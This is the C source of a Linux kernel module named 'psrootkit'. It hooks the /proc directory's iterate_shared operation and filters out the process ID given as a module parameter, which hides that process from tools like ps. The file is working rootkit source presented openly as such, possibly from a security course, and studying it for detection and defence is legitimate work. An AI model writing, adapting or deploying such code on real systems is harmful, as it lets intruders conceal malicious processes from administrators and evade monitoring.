#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CHEN Siyuan, SESI");
MODULE_DESCRIPTION("psrootkit module");

static char* pid = "1";
module_param(pid, charp, 0660);

static struct file *proc;
static const struct file_operations* proc_fops;
static struct file_operations fops;
static struct dentry *proc_dentry;
static struct dir_context *origin_ctx;

bool ctx_actor(struct dir_context * ctx, const char *name, int i, loff_t pos, u64 num, unsigned x){
    if (strcmp(name, pid) == 0) {
        return true;
    }
    return origin_ctx->actor(origin_ctx, name, i, pos, num, x);
}

struct dir_context new_ctx = {
    .actor = ctx_actor,
};

int hide_proc_iterate_shared(struct file *file, struct dir_context *ctx)
{
    origin_ctx = ctx;
    new_ctx.pos = ctx->pos; 
    proc_fops->iterate_shared(file,&new_ctx);
    ctx->pos = new_ctx.pos;
    return 0;
}    

static int __init psrootkit_init(void)
{
    proc = filp_open("/proc", O_RDONLY, 0);
    proc_dentry = file_dentry(proc);

    proc_fops = proc -> f_op;

    fops = *(proc->f_op);
    fops.iterate_shared = hide_proc_iterate_shared;

    proc_dentry->d_inode->i_fop = &fops;
    printk(KERN_INFO "psrootkit module loaded\n");
    return 0;
}

static void __exit psrootkit_exit(void)
{
    proc_dentry->d_inode->i_fop = proc_fops;
    // filp_close(proc, NULL);
    printk(KERN_INFO "psrootkit module unloaded\n");
}

module_init(psrootkit_init);

module_exit(psrootkit_exit);